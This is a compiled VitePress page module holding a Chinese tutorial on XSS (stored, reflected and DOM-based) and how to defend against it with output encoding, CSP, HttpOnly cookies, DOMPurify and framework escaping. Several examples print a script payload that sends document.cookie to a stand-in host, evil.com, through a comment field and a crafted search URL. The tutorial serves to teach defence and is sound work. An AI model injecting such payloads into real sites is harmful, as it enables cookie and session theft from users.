import{_ as e,c as s,o as a,Q as t}from"./chunks/framework.ef145a76.js";const y=JSON.parse('{"title":"","description":"","frontmatter":{},"headers":[],"relativePath":"web/网络和浏览器/常见安全问题-XSS.md","filePath":"web/网络和浏览器/常见安全问题-XSS.md"}'),l={name:"web/网络和浏览器/常见安全问题-XSS.md"},n=t(`<h2 id="xss-跨站脚本攻击" tabindex="-1">XSS（跨站脚本攻击） <a class="header-anchor" href="#xss-跨站脚本攻击" aria-label="Permalink to &quot;XSS（跨站脚本攻击）&quot;">​</a></h2><h3 id="存储型-xss-stored-xss" tabindex="-1">存储型 XSS（Stored XSS） <a class="header-anchor" href="#存储型-xss-stored-xss" aria-label="Permalink to &quot;存储型 XSS（Stored XSS）&quot;">​</a></h3><h4 id="步骤" tabindex="-1">步骤： <a class="header-anchor" href="#步骤" aria-label="Permalink to &quot;步骤：&quot;">​</a></h4><ol><li><strong>提交带脚本的内容</strong><ul><li>比如在网站的评论、昵称、签名、文章等输入框中输入恶意脚本：</li></ul></li></ol><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">&lt;script&gt;fetch(&#39;https://evil.com/steal?cookie=&#39; + document.cookie)&lt;/script&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">&lt;script&gt;fetch(&#39;https://evil.com/steal?cookie=&#39; + document.cookie)&lt;/script&gt;</span></span></code></pre></div><ol start="2"><li><strong>服务端没有进行过滤与转义</strong><ul><li>直接存入数据库，下一次页面渲染时会原样输出到 HTML 页面中。</li></ul></li><li><strong>用户访问该内容页面</strong><ul><li>浏览器解析页面时执行 <code>&lt;script&gt;</code>，从而泄露信息。</li></ul></li></ol><h4 id="示例" tabindex="-1">示例： <a class="header-anchor" href="#示例" aria-label="Permalink to &quot;示例：&quot;">​</a></h4><p>用户访问页面时看到的内容是：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">&lt;p&gt;黑客的评论：&lt;/p&gt; </span></span>
<span class="line"><span style="color:#e1e4e8;">&lt;script&gt;fetch(&#39;https://evil.com/steal?cookie=&#39; + document.cookie)&lt;/script&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">&lt;p&gt;黑客的评论：&lt;/p&gt; </span></span>
<span class="line"><span style="color:#24292e;">&lt;script&gt;fetch(&#39;https://evil.com/steal?cookie=&#39; + document.cookie)&lt;/script&gt;</span></span></code></pre></div><p>用户的 <code>document.cookie</code> 被发送给黑客控制的服务器。</p><h3 id="反射型-xss-reflected-xss" tabindex="-1">反射型 XSS（Reflected XSS） <a class="header-anchor" href="#反射型-xss-reflected-xss" aria-label="Permalink to &quot;反射型 XSS（Reflected XSS）&quot;">​</a></h3><h4 id="步骤-1" tabindex="-1">步骤： <a class="header-anchor" href="#步骤-1" aria-label="Permalink to &quot;步骤：&quot;">​</a></h4><ol><li>比如构造一个<strong>带脚本的 URL</strong>，例如 <code>https://abc.com/search?q=&lt;script&gt;fetch(&#39;https://evil.com/steal?cookie=&#39;+document.cookie)&lt;/script&gt;</code></li><li><strong>abc.com 的搜索功能页面会将参数 <code>q</code> 直接插入到 HTML 中</strong>，比如： <code>你搜索了：&lt;div id=&quot;result&quot;&gt;\${q}&lt;/div&gt;</code></li><li>诱导用户点击这个链接（比如在钓鱼邮件、评论、微信发链接）。</li><li>用户点击后访问该地址，浏览器解析并执行注入的 <code>&lt;script&gt;</code>，泄露信息。</li></ol><h3 id="dom-型-xss-dom-based-xss" tabindex="-1">DOM 型 XSS（DOM-based XSS） <a class="header-anchor" href="#dom-型-xss-dom-based-xss" aria-label="Permalink to &quot;DOM 型 XSS（DOM-based XSS）&quot;">​</a></h3><p>恶意代码<strong>不经过服务器处理</strong>，而是通过前端 JavaScript 操作 DOM 导致执行。</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">// 页面脚本：将 URL 中参数直接插入页面</span></span>
<span class="line"><span style="color:#e1e4e8;">document.getElementById(&#39;output&#39;).innerHTML = location.search;</span></span>
<span class="line"><span style="color:#e1e4e8;"></span></span>
<span class="line"><span style="color:#e1e4e8;">// 用户访问</span></span>
<span class="line"><span style="color:#e1e4e8;">?msg=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">// 页面脚本：将 URL 中参数直接插入页面</span></span>
<span class="line"><span style="color:#24292e;">document.getElementById(&#39;output&#39;).innerHTML = location.search;</span></span>
<span class="line"><span style="color:#24292e;"></span></span>
<span class="line"><span style="color:#24292e;">// 用户访问</span></span>
<span class="line"><span style="color:#24292e;">?msg=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</span></span></code></pre></div><h3 id="xss攻击的目的" tabindex="-1">XSS攻击的目的 <a class="header-anchor" href="#xss攻击的目的" aria-label="Permalink to &quot;XSS攻击的目的&quot;">​</a></h3><ul><li><p>窃取 Cookie，获取用户身份认证信息</p></li><li><p>伪造用户行为（如转账、点赞）</p></li><li><p>注入广告、钓鱼链接</p></li><li><p>绕过 CSRF 防御等手段</p></li></ul><h2 id="如何防御-xss" tabindex="-1">如何防御 XSS <a class="header-anchor" href="#如何防御-xss" aria-label="Permalink to &quot;如何防御 XSS&quot;">​</a></h2><h4 id="_1-输入过滤-输出编码" tabindex="-1">1. 输入过滤 + 输出编码 <a class="header-anchor" href="#_1-输入过滤-输出编码" aria-label="Permalink to &quot;1. 输入过滤 + 输出编码&quot;">​</a></h4><p>输入过滤：</p><p>过滤掉明显危险的字符：如 <code>&lt;script&gt;</code>, <code>&lt;img onerror=...&gt;</code> 等 注意不能仅靠黑名单，容易绕过。</p><p>输出编码（重要）：</p><table><thead><tr><th>场景</th><th>防御方式</th></tr></thead><tbody><tr><td>HTML 标签中内容</td><td>转义 <code>&lt; &gt; &amp; &quot; &#39;</code> 等字符</td></tr><tr><td>属性中</td><td>使用属性值时转义 <code>&quot;</code> <code>&#39;</code></td></tr><tr><td>JS 中</td><td>严禁拼接脚本代码，使用 JSON 编码</td></tr><tr><td>URL 中</td><td><code>encodeURIComponent()</code></td></tr></tbody></table><p><strong>推荐工具：</strong></p><ul><li>前端：<code>DOMPurify</code>、<code>xss</code> 库</li><li>后端（Node.js）：<code>xss-filters</code>、<code>helmet</code></li></ul><h4 id="_2-使用-csp-内容安全策略" tabindex="-1">2. 使用 CSP（内容安全策略） <a class="header-anchor" href="#_2-使用-csp-内容安全策略" aria-label="Permalink to &quot;2. 使用 CSP（内容安全策略）&quot;">​</a></h4><p>限制页面可以加载的资源，防止注入脚本执行。</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</span></span></code></pre></div><h4 id="_3-httponly-secure-设置-cookie" tabindex="-1">3. HttpOnly + Secure 设置 Cookie <a class="header-anchor" href="#_3-httponly-secure-设置-cookie" aria-label="Permalink to &quot;3. HttpOnly + Secure 设置 Cookie&quot;">​</a></h4><p>防止通过 JavaScript 获取 Cookie 信息。</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict</span></span></code></pre></div><h4 id="_4-使用框架内建的防御机制" tabindex="-1">4. 使用框架内建的防御机制 <a class="header-anchor" href="#_4-使用框架内建的防御机制" aria-label="Permalink to &quot;4. 使用框架内建的防御机制&quot;">​</a></h4><ul><li>React 默认对 JSX 中插值内容进行转义</li><li>Vue 自动转义插值表达式</li><li>不要使用 <code>v-html</code>、<code>dangerouslySetInnerHTML</code> 除非特别谨慎</li></ul><h4 id="备注" tabindex="-1">备注： <a class="header-anchor" href="#备注" aria-label="Permalink to &quot;备注：&quot;">​</a></h4><h5 id="vue或react中如果要使用富文本-可以使用dompurify库先转换" tabindex="-1">vue或react中如果要使用富文本，可以使用dompurify库先转换 <a class="header-anchor" href="#vue或react中如果要使用富文本-可以使用dompurify库先转换" aria-label="Permalink to &quot;vue或react中如果要使用富文本，可以使用dompurify库先转换&quot;">​</a></h5><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">npm install dompurify</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">npm install dompurify</span></span></code></pre></div><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">import DOMPurify from &#39;dompurify&#39;;</span></span>
<span class="line"><span style="color:#e1e4e8;"></span></span>
<span class="line"><span style="color:#e1e4e8;">export default {</span></span>
<span class="line"><span style="color:#e1e4e8;">  computed: {</span></span>
<span class="line"><span style="color:#e1e4e8;">    safeHtml() {</span></span>
<span class="line"><span style="color:#e1e4e8;">      return DOMPurify.sanitize(this.content);</span></span>
<span class="line"><span style="color:#e1e4e8;">    },</span></span>
<span class="line"><span style="color:#e1e4e8;">  },</span></span>
<span class="line"><span style="color:#e1e4e8;">};</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">import DOMPurify from &#39;dompurify&#39;;</span></span>
<span class="line"><span style="color:#24292e;"></span></span>
<span class="line"><span style="color:#24292e;">export default {</span></span>
<span class="line"><span style="color:#24292e;">  computed: {</span></span>
<span class="line"><span style="color:#24292e;">    safeHtml() {</span></span>
<span class="line"><span style="color:#24292e;">      return DOMPurify.sanitize(this.content);</span></span>
<span class="line"><span style="color:#24292e;">    },</span></span>
<span class="line"><span style="color:#24292e;">  },</span></span>
<span class="line"><span style="color:#24292e;">};</span></span></code></pre></div><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">&lt;div v-html=&quot;safeHtml&quot;&gt;&lt;/div&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">&lt;div v-html=&quot;safeHtml&quot;&gt;&lt;/div&gt;</span></span></code></pre></div><h5 id="如果只是显示文本-不需要-html-直接插值" tabindex="-1">如果只是显示文本（不需要 HTML），直接插值： <a class="header-anchor" href="#如果只是显示文本-不需要-html-直接插值" aria-label="Permalink to &quot;如果只是显示文本（不需要 HTML），直接插值：&quot;">​</a></h5><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">&lt;p&gt;{{ content }}&lt;/p&gt; &lt;!-- 自动转义 --&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">&lt;p&gt;{{ content }}&lt;/p&gt; &lt;!-- 自动转义 --&gt;</span></span></code></pre></div><h5 id="安全用法的-settimeout" tabindex="-1">安全用法的 <code>setTimeout</code> <a class="header-anchor" href="#安全用法的-settimeout" aria-label="Permalink to &quot;安全用法的 \`setTimeout\`&quot;">​</a></h5><p>不安全的：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">const userInput = &quot;alert(&#39;XSS&#39;)&quot;;</span></span>
<span class="line"><span style="color:#e1e4e8;">setTimeout(userInput, 1000); // ⚠️ 会执行 alert(&#39;XSS&#39;)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">const userInput = &quot;alert(&#39;XSS&#39;)&quot;;</span></span>
<span class="line"><span style="color:#24292e;">setTimeout(userInput, 1000); // ⚠️ 会执行 alert(&#39;XSS&#39;)</span></span></code></pre></div><p>安全写法：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">// ✅ 正确写法：传入函数，不传字符串</span></span>
<span class="line"><span style="color:#e1e4e8;">setTimeout(() =&gt; {</span></span>
<span class="line"><span style="color:#e1e4e8;">  console.log(&quot;安全执行&quot;);</span></span>
<span class="line"><span style="color:#e1e4e8;">}, 1000);</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">// ✅ 正确写法：传入函数，不传字符串</span></span>
<span class="line"><span style="color:#24292e;">setTimeout(() =&gt; {</span></span>
<span class="line"><span style="color:#24292e;">  console.log(&quot;安全执行&quot;);</span></span>
<span class="line"><span style="color:#24292e;">}, 1000);</span></span></code></pre></div><h5 id="禁止使用-new-function" tabindex="-1">禁止使用 new Function() <a class="header-anchor" href="#禁止使用-new-function" aria-label="Permalink to &quot;禁止使用 new Function()&quot;">​</a></h5><p>不安全的：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">new Function(userInput)(); // ⚠️ 也会执行 alert(&#39;XSS&#39;)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">new Function(userInput)(); // ⚠️ 也会执行 alert(&#39;XSS&#39;)</span></span></code></pre></div><h5 id="不要在标签上添加事件" tabindex="-1">不要在标签上添加事件 <a class="header-anchor" href="#不要在标签上添加事件" aria-label="Permalink to &quot;不要在标签上添加事件&quot;">​</a></h5><p>危险写法：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">&lt;div onclick=&quot;...&quot;&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">&lt;div onclick=&quot;...&quot;&gt;</span></span></code></pre></div><p>应该使用 <code>addEventListener</code> / <code>@click</code></p><h5 id="不使用-innerhtml-eval" tabindex="-1">不使用 innerHTML，eval()， <a class="header-anchor" href="#不使用-innerhtml-eval" aria-label="Permalink to &quot;不使用 innerHTML，eval()，&quot;">​</a></h5><p>可以使用 textContent, appendChild 相对安全</p>`,55),o=[n];function p(c,i,r,d,h,u){return a(),s("div",null,o)}const v=e(l,[["render",p]]);export{y as __pageData,v as default};
